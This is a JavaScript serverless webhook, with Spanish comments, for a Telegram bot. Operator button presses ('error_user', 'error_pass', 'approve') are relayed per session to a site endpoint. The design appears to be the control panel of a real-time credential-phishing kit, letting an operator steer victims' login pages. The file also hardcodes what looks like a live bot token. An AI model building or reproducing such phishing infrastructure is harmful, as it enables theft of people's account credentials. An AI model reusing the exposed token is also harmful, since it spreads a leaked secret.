const TELEGRAM_BOT_TOKEN = '8656222103:AAGWGteDKnSWVQVKXk-Q8AbOnv2RWCUAfpw';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Método no permitido' });
    }

    try {
        const update = req.body;

        console.log('[Webhook] Update recibido:', JSON.stringify(update, null, 2));

        // Manejar callback queries (botones)
        if (update.callback_query) {
            const callback = update.callback_query;
            const data = callback.data;
            const messageId = callback.message?.message_id;
            
            console.log(`[Callback] Data: ${data}, Message ID: ${messageId}`);
            
            let action = null;
            let session = null;
            
            // Parsear el callback_data
            if (data.startsWith('error_user_')) {
                action = 'error_user';
                session = data.replace('error_user_', '');
            } else if (data.startsWith('error_pass_')) {
                action = 'error_pass';
                session = data.replace('error_pass_', '');
            } else if (data.startsWith('approve_')) {
                action = 'approve';
                session = data.replace('approve_', '');
            }

            if (session && action) {
                // Obtener URL base (para Vercel)
                const baseUrl = process.env.VERCEL_URL 
                    ? `https://${process.env.VERCEL_URL}` 
                    : `https://${req.headers.host}`;

                console.log(`[Telegram Response] Enviando a: ${baseUrl}/api/telegram-response`);

                try {
                    // Enviar respuesta al servidor
                    const response = await fetch(`${baseUrl}/api/telegram-response`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ session, action })
                    });

                    const responseData = await response.json();
                    console.log('[API Response]:', responseData);
                } catch (fetchError) {
                    console.error('[Fetch Error]:', fetchError);
                }

                // Responder a Telegram (dismiss del botón)
                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            callback_query_id: callback.id,
                            text: '✅ Respuesta procesada',
                            show_alert: false
                        })
                    });

                    console.log('[Telegram] Callback query respondido');
                } catch (tgError) {
                    console.error('[Telegram Error]:', tgError);
                }
            }

            return res.status(200).json({ ok: true });
        }

        // Manejar mensajes de texto
        if (update.message) {
            console.log('[Message]:', update.message.text);
            return res.status(200).json({ ok: true });
        }

        return res.status(200).json({ ok: true });
    } catch (error) {
        console.error('[Webhook Error]:', error);
        return res.status(500).json({ error: 'Error interno' });
    }
}
